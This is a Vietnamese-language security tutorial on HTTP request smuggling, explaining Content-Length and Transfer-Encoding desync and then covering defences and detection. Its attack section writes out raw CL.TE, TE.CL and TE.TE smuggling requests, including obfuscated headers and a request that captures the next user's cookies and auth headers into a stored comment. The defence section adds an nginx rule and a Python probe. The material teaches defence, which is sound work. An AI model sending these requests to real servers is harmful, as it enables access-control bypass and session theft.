# HTTP Request Smuggling

> **OWASP Top 10:2025**: A08 | **CWE**: CWE-444 | **Nguồn**: PortSwigger, RFC 7230, James Kettle Research

## 🧱 Kiến thức Nền tảng

Trong kiến trúc web hiện đại, request của người dùng thường đi qua nhiều lớp: **CDN → Load Balancer → Reverse Proxy → Application Server**. Các lớp này giao tiếp bằng giao thức HTTP, và để tối ưu hiệu suất, chúng thường sử dụng **connection reuse** (tái sử dụng kết nối) — nhiều HTTP request được gửi qua cùng một TCP connection.

Giao thức HTTP/1.1 có hai cơ chế xác định ranh giới giữa các request:
- **Content-Length (CL)**: chỉ định số byte trong body
- **Transfer-Encoding (TE)**: sử dụng chunked encoding, body được chia thành các chunk

Theo RFC 7230, khi cả hai header cùng xuất hiện, `Transfer-Encoding` phải được ưu tiên. Tuy nhiên, trên thực tế, mỗi server xử lý khác nhau — tạo ra sự không đồng nhất (**desync**) giữa front-end và back-end.

```
# Normal HTTP/1.1 request flow through proxy chain
Client ──→ [Front-end Proxy] ──TCP connection──→ [Back-end Server]
           │                                      │
           │  Request 1: POST /api                 │  Parses request boundaries
           │  Request 2: GET /home                 │  using CL or TE headers
           │  (multiplexed on same connection)     │
```

```http
# Normal request with Content-Length
POST /api/submit HTTP/1.1
Host: example.com
Content-Length: 13

{"key":"val"}
```

```http
# Normal request with Transfer-Encoding: chunked
POST /api/submit HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

d\r\n
{"key":"val"}\r\n
0\r\n
\r\n
```

## 🔍 Mô tả lỗ hổng

HTTP Request Smuggling xảy ra khi front-end proxy và back-end server không thống nhất về cách phân tách ranh giới request. Kẻ tấn công gửi một request được thiết kế đặc biệt, khiến một phần của request bị "nhét" (smuggle) vào đầu request tiếp theo — có thể là request của **người dùng khác**.

Có ba biến thể chính:
- **CL.TE**: Front-end dùng Content-Length, back-end dùng Transfer-Encoding
- **TE.CL**: Front-end dùng Transfer-Encoding, back-end dùng Content-Length
- **TE.TE**: Cả hai dùng Transfer-Encoding nhưng xử lý obfuscation khác nhau

Hậu quả bao gồm: bypass WAF, chiếm session người dùng, cache poisoning, và truy cập endpoint nội bộ.

## ⚔️ Cơ chế tấn công

**CL.TE Attack — Front-end dùng CL, back-end dùng TE:**

```http
# CL.TE smuggling: front-end reads 6 bytes, back-end uses chunked
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n
\r\n
G
```

```
# What happens:
# Front-end sees Content-Length: 6 → forwards "0\r\n\r\nG" as the body
# Back-end sees Transfer-Encoding: chunked → reads chunk "0" (end of body)
# The leftover "G" becomes the START of the next request: "GPOST /admin ..."
# This poisons the next user's request!
```

**TE.CL Attack — Front-end dùng TE, back-end dùng CL:**

```http
# TE.CL smuggling: smuggle a request to access /admin
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c\r\n
GPOST /admin HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

**TE.TE — Obfuscation để chỉ một bên nhận TE:**

```http
# TE.TE with obfuscation — one server ignores the malformed header
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow            # Obfuscated — some servers ignore this
Transfer-Encoding : chunked       # Extra space before colon
Transfer-Encoding: chunked
Transfer-encoding: x              # Lowercase 'e' variant

5c\r\n
GPOST /admin HTTP/1.1\r\n
Host: vulnerable.com\r\n
\r\n
0\r\n
\r\n
```

**Chiếm request của người dùng khác:**

```http
# Smuggle a request that captures the next user's request into a stored field
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /store-comment HTTP/1.1
Host: vulnerable.com
Content-Length: 800
Content-Type: application/x-www-form-urlencoded

comment=
# The next user's ENTIRE request (including cookies, auth headers)
# gets appended to the "comment" parameter and stored!
```

## 🛡️ Biện pháp phòng thủ

1. **Sử dụng HTTP/2 end-to-end** — HTTP/2 dùng binary framing, loại bỏ hoàn toàn ambiguity về ranh giới request. Đảm bảo không downgrade sang HTTP/1.1 ở back-end.

2. **Cấu hình proxy từ chối request ambiguous** — reject request có cả `Content-Length` và `Transfer-Encoding`:

```nginx
# Nginx — reject ambiguous requests
if ($http_transfer_encoding ~* "chunked" ) {
    # If both CL and TE are present, return 400
    set $ambiguous "TE";
}
if ($content_length != "") {
    set $ambiguous "${ambiguous}CL";
}
if ($ambiguous = "TECL") {
    return 400;  # Reject ambiguous requests
}
```

3. **Normalize header** trước khi forward — strip duplicate `Transfer-Encoding`, loại bỏ obfuscation.

4. **Mỗi request một TCP connection** — tắt connection reuse giữa front-end và back-end (giảm hiệu suất nhưng an toàn).

5. **Sử dụng công cụ kiểm tra** — Burp Suite's HTTP Request Smuggler extension để phát hiện vulnerability.

## 💻 Code Example

```python
# === DETECTION SCRIPT: Detect CL.TE smuggling vulnerability ===
import socket

def test_cl_te(host, port=80):
    """Send a CL.TE probe to detect request smuggling"""
    # Craft a probe: if CL.TE exists, the smuggled request causes a timeout diff
    probe = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"            # Front-end reads 4 bytes
        f"Transfer-Encoding: chunked\r\n"   # Back-end reads chunked
        f"\r\n"
        f"1\r\n"                             # Chunk of 1 byte
        f"Z\r\n"                             # The chunk data
        f"Q\r\n"                             # INVALID chunk — back-end hangs waiting
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))
    sock.send(probe.encode())

    try:
        response = sock.recv(4096)
        print("[SAFE] Server responded normally")
    except socket.timeout:
        print("[VULN] Timeout detected — possible CL.TE smuggling!")
    finally:
        sock.close()

# === SECURE: Express.js middleware to reject ambiguous requests ===
# const express = require('express');
# app.use((req, res, next) => {
#     const hasCL = req.headers['content-length'] !== undefined;
#     const hasTE = req.headers['transfer-encoding'] !== undefined;
#     if (hasCL && hasTE) {
#         // Reject requests with both Content-Length and Transfer-Encoding
#         return res.status(400).send('Ambiguous request rejected');
#     }
#     next();
# });
```

## 📚 Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/request-smuggling
- OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling
- CWE: https://cwe.mitre.org/data/definitions/444.html
- James Kettle: https://portswigger.net/research/http-desync-attacks
